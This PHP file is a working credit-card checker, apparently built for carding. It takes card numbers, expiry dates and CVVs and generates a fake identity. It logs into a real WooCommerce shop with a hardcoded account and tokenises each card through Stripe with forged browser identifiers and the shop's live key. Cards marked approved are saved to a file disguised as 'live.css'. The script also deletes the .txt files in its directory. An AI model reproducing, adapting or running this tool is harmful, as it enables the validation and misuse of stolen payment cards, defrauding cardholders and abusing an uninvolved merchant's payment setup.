<?php

foreach(glob('*.txt') as $dele)
{
    unlink($dele);
}


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Venezuela');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function dadosnome(){
	$nome = file("lista_nomes.txt");
    $mynome = rand(0, sizeof($nome)-1);
    $nome = $nome[$mynome];
	return $nome;
}
function dadossobre(){
	$sobrenome = file("lista_sobrenomes.txt");
    $mysobrenome = rand(0, sizeof($sobrenome)-1);
    $sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;

}


function email($nome){
	$email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
	return $email;
}

$cpf = cpf(1);
$nome = dadosnome();
$sobrenome = dadossobre();
$email = email($nome);


$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "fa fa-cc-mastercard";
$info = "MasterCard";
}else if($cbin == "4"){
$cbin = "fa fa-cc-visa";
$info = "Visa";
}else if($cbin == "3"){
$cbin = "fa fa-cc-amex";
$info = "Amex";
}else if($cbin == "6"){
$cbin = "fa fa-cc-discover";
$info = "Discover";
}

    $random                = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 7)), 0, 7);
    $random_valor          = rand(5, 10);
    $random_valor_centavos = rand(10, 99);
	$random_st = rand(10, 999);
	$sec = rand(20, 30);
	$fone = rand(1000, 9999);



$number4 = substr($cc,12,4);

switch ($mes) {
		   case '01':
		   $mess = '1';
		   break;
		   case '02':
		   $mess = '2';
		   break;
		   case '03':
		   $mess = '3';
		   break;
		   case '04':
		   $mess = '4';
		   break;
		   case '05':
		   $mess = '5';
		   break;
		   case '06':
		   $mess = '6';
		   break;
		   case '07':
		   $mess = '7';
		   break;
		   case '08':
		   $mess = '8';
		   break;
		   case '09':
		   $mess = '9';
		   break;
		   case '10':
		   $mess = '10';
		   break;
		   case '11':
		   $mess = '11';
		   break;
		   case '12':
		   $mess = '12';
		   break;
		   
	   }

	   switch ($ano) {
		   case '2018';
		   $anoo = '18';
		   case '2019':
		   $anoo = '19';
		   case '2020':
		   $anoo = '20';
		   break;
		   case '2021':
		   $anoo= '21';
		   break;
		   case '2022':
		   $anoo = '22';
		   break;
		   case '2023':
		   $anoo = '23';
		   break;
		   case '2024':
		   $anoo = '24';
		   break;
		   case '2025':
		   $anoo = '25';
		   break;
		   case '2026':
		   $anoo = '26';
		   break;
	   }

	 b:
foreach(glob('*.txt') as $dele)
{
    unlink($dele);
}

	$sign = "sleep.css";
	$sign_arr = file($sign);
	$sign_lines = count($sign_arr);
	$sign_arr_index = $sign_lines - 1;
	$sign_index = rand(0, $sign_arr_index);
	$sign_text = $sign_arr[$sign_index];
	$sleep = trim($sign_text);
$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIE, 1); 
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  $resposta = curl_exec($ch);
  $email = GetStr($resposta, 'email":"', '"');

  $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
  $serv_rnd = $serve_arr[array_rand($serve_arr)];
  $email= str_replace("example.com", $serv_rnd, $email);
   



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://felixmerchant.com/my-account/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$random.'.txt');
$get = curl_exec($ch);
$token = trim(strip_tags(getstr($get,'type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="','"')));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://felixmerchant.com/my-account/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$random.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username=xafayen355%40mrisemail.com&password=123qwe%21%40%23QWE&woocommerce-login-nonce='.$token.'&_wp_http_referer=%2Fmy-account%2F&login=Log+in');
$login = curl_exec($ch);








    $random1                = substr(str_shuffle(str_repeat("apqrstuvwxybcdefg6789hijklmnoz123450", 8)), 0, 8);
    $random2                = substr(str_shuffle(str_repeat("opqrstuvwxyz1234567890abcdefghijklmn", 4)), 0, 4);
    $random3                = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz1234567890", 4)), 0, 4);
    $random4                = substr(str_shuffle(str_repeat("abcden5678opqrst4923ufghijklmvwxyz1230", 4)), 0, 4);
    $random5                = substr(str_shuffle(str_repeat("ijklmnopqryz1234abcdefgh567stuvwx890", 12)), 0, 12);


    $random6                = substr(str_shuffle(str_repeat("axyb789hicdefg6jklmnozpqrstuvw123450", 8)), 0, 8);
    $random7                = substr(str_shuffle(str_repeat("owx2ef1gyz12345pqrstuv67890abcdh5ijklmn", 4)), 0, 4);
    $random8                = substr(str_shuffle(str_repeat("ano34pqr4st13u5yz125bcdevwxfghijklm67890", 4)), 0, 4);
    $random9                = substr(str_shuffle(str_repeat("56op5qrabcd1ufg4hijenst49k43lmv78wxyz1230", 4)), 0, 4);
    $random10                = substr(str_shuffle(str_repeat("imno23pqry12zfgh564ab73cdesj1kltuvwx890", 12)), 0, 12);

    $random11                = substr(str_shuffle(str_repeat("9himnozcdefg6jklpaxyb78qrstuvw123450", 8)), 0, 8);
    $random12                = substr(str_shuffle(str_repeat("ow10abcdhgy5z124pqrsx2eftuv678953ijklmn", 4)), 0, 4);
    $random13                = substr(str_shuffle(str_repeat("qr4s2t1325bvwxf7cano34pdegh3ijklmu56yz167890", 4)), 0, 4);
    $random14                = substr(str_shuffle(str_repeat("1od5qr4jensbct49pakg4hiy34563lmv78wx1ufz1230", 4)), 0, 4);
    $random15                = substr(str_shuffle(str_repeat("if12ab733ltu5vw54cd3pqry12zesjgh21e32x890", 12)), 0, 12);

    $random16               = substr(str_shuffle(str_repeat("3cd3pq512221e325aw23eb7x354zry1esjltu5if78vgh890", 8)), 0, 8);
    $random17                = substr(str_shuffle(str_repeat("3xvrs2e51d790br9t1eraw233f52e54xs5ifzry1esjleb7512gh89ffde015ef4575cc61555b870221e32578vtuv51", 32)), 0, 32);










$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$random.'.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host	api.stripe.com',
'User-Agent	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
'Accept	application/json',
'Content-Type	application/x-www-form-urlencoded',
'Referer	https://js.stripe.com/v3/controller-'.$random17.'.html',
'Content-Length	470',
'Origin	https://js.stripe.com',
'Connection	keep-alive',
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=+&owner[email]='.trim(urlencode($email)).'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid='.$random1.'-'.$random2.'-'.$random3.'-'.$random4.'-'.$random5.'&muid='.$random6.'-'.$random7.'-'.$random8.'-'.$random9.'-'.$random10.'&sid='.$random11.'-'.$random12.'-'.$random13.'-'.$random14.'-'.$random15.'&payment_user_agent=stripe.js%2F'.$random16.'%3B+stripe-js-v3%2F'.$random16.'&time_on_page=62046&referrer=https%3A%2F%2Ffelixmerchant.com%2Fmy-account%2Fadd-payment-method%2F&key=pk_live_mhRgRG1tbW8Fj57HxnWbWRqy');
$franco = curl_exec($ch);
$stripe = trim(strip_tags(getstr($franco,'id": "','"')));




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://felixmerchant.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$random.'.txt');
$get1 = curl_exec($ch);
$token1 = trim(strip_tags(getstr($get1,'type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="','"')));






$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://felixmerchant.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$random.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=stripe&woocommerce-add-payment-method-nonce='.$token1.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1&stripe_source='.$stripe.'');                         
$pagamento = curl_exec($ch);







   if(strpos($pagamento, "MasterCard ending in $number4")){
 
echo '<tr><td><font size="2"><font color="#00FF00"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#00FF00" size="1">Aprovada 💳</font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'</font></td><td><font size="1">'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#00FF00" size="1">1.00$</font></td><td><font size="1"> Pais: '.$pais.' | Banco: '.$banco.' | Nível: '.$level.' | Tipo : '.$tipo.' </font> </td><td><font size="1">Pagamento: Pagamento Autorizado</td></tr>';



$hnd = fopen("./live.css", "a");
		fwrite($hnd, "$cc|$mes|$ano|$cvv\n");
		fclose($hnd);


echo "
<script language=\"JavaScript\">
var audio = new Audio(\"arquivos/live.wav\");
audio.play();</script>";

}


   elseif(strpos($pagamento, "There was a problem adding the payment method.")) {
echo '<tr><td><font size="2"><font color="#FF0000"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#FF0000" size="1">Reprovada Declined 💳</font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'/'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#FF0000" size="1">1.00$</font></td><td><font size="1"> Pais: '.$pais.' | Banco: '.$banco.' | Nível: '.$level.' | Tipo : '.$tipo.' </font> </td><td><font size="1">Card was declined</td></tr>';
sleep($sleep);
}

   else{
 echo '<tr><td><font size="2"><font color="#FF0000"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#FF0000" size="1">Reprovada Unknown 💳</font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'/'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#FF0000" size="1">1.00$</font></td><td><font size="1"> Pais: '.$pais.' | Banco: '.$banco.' | Nível: '.$level.' | Tipo : '.$tipo.' </font> </td><td><font size="1">Card was declined</td></tr>';
 sleep($sleep);
}

curl_close($ch);
ob_flush();
///echo $pagamento;
?>